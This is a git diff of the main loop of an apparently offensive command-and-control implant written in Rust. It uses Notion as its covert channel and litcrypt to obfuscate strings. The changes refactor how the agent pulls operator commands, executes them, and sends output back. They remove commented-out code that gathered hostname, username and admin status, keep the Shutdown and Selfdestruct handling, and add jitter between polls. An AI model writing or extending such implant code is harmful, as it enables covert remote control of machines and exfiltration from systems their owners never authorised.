@@ -19,7 +19,7 @@ use litcrypt::{lc, use_litcrypt};
 
 mod config;
 pub mod channels;
-use channels::{Channel, ChannelType};
+use channels::{Channel, ChannelType, ChannelError};
 use config::{
     ConfigOptions,
     get_config_options, 
@@ -91,12 +91,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
-    // TODO: Initialize Channel
-
+    // Initialize main Logger
     let logger = logger::Logger::new(config_options.log_level.clone());
 
+    // Create Channel Type
     let channel_type = config_options.channel_type.clone();
 
+    // Create channel
     let mut channel = match channel_type {
         ChannelType::Notion(nc) => nc,
         ChannelType::Unknown => {
@@ -144,18 +145,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         exit(1)
     }
 
-    // MOVED TO CHANNEL
-    // ================
-    // let mut hn = hostname();
-    // let username = whoami::username();
-    // hn.push_str(" | ");
-    // hn.push_str(&username);
-    // let is_admin = cmd::getprivs::is_elevated();  
-    // logger.info(format!("Admin context: {}", is_admin));
-    // if is_admin {
-    //     hn.push_str("*");
-    // }
-
     // CHANNEL PROCEDURE
     // =================
     // 1. Load config
@@ -173,56 +162,25 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let commands: Vec<AgentCommand>  = channel.receive().await.unwrap();
 
         for mut c in commands {
+            println!("{:?}", c);
             let output: String = c.handle(&mut config_options, &logger).await?;
             channel.complete(c.clone()).await;
-            channel.send(output, &c.rel).await.unwrap();
+            match channel.send(output, &c.rel).await {
+                Ok(r) => {
+                    logger.debug(log_out!("Send Success:", &r));
+                },
+                Err(e) =>  {
+                    let msg = e.msg;
+                    logger.err(log_out!("Send Error:", &msg));
+                }
+            }
+            // Watch for shutdown
             match c.command_type {
                 CommandType::Shutdown => {exit(0);},
                 CommandType::Selfdestruct => {exit(0)},
                 _ => {}
             }
         };
-
-        // OLD CODE
-        // ========
-        // Get Blocks
-        // let blocks = get_blocks(&client, &page_id).await?;
-
-        // let command_blocks: Vec<&serde_json::Value> = blocks
-        //     .as_array()
-        //     .unwrap()
-        //     .into_iter()
-        //     .filter(|&b| b["type"] == "to_do")
-        //     .collect();
-
-        // let new_command_blocks: Vec<&serde_json::Value> = command_blocks
-        //     .into_iter()
-        //     .filter(|&b| b["to_do"]["checked"] == false)
-        //     .collect();
-
-        // for block in new_command_blocks {
-        //     match block["to_do"]["text"][0]["text"]["content"].as_str() {
-        //         Some(s) => {
-        //             if s.contains("🎯") {
-        //                 logger.info(log_out!("Got command: ", s));
-        //                 let mut notion_command = AgentCommand::from_string(s.replace("🎯",""))?;
-        //                 let output = notion_command.handle(&mut config_options, &logger).await?;
-        //                 let command_block_id = block["id"].as_str().unwrap();
-        //                 complete_command(&client, block.to_owned(), &logger).await;
-        //                 send_result(&client, command_block_id, output, &logger).await;
-        //                 // Check for any final work based on command type,
-        //                 // Like shutting down the agent
-        //                 match notion_command.command_type {
-        //                     CommandType::Shutdown => {exit(0);},
-        //                     CommandType::Selfdestruct => {exit(0)},
-        //                     _ => {}
-        //                 }
-        //             };
-
-        //         },
-        //         None => { continue; }
-        //     }
-        // }
 
         // Handle jitter
         let mut rng = rand::thread_rng();
